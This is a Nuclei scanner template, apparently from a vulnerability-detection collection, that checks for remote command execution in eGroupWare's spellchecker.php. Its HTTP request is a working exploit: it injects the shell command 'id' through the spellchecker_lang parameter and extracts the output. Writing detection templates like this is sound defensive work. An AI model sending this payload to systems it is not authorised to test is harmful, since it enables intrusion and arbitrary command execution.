id: egroupware-spellchecker-rce

info:
  name: eGroupWare spellchecker.php RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    eGroupWare contains a remote command execution vulnerability in the spellchecker.php file. Attackers can execute arbitrary system commands on vulnerable systems.
  reference:
    - https://github.com/Ret2LC/BetterSploit/blob/e8d1d5f8a41508c2b376c84cb57dbe61f48f38a4/BetterSploit/exploitz/exploitz/eGroupWare-1.14-spellchecker-RCE.py

variables:
  cmd_payload: '{{url_encode("||id||")}}'

http:
  - raw:
      - |
        GET /egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl{{cmd_payload}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "Error executing"

    extractors:
      - type: regex
        regex:
          - "\\n([^']+)"
        group: 1
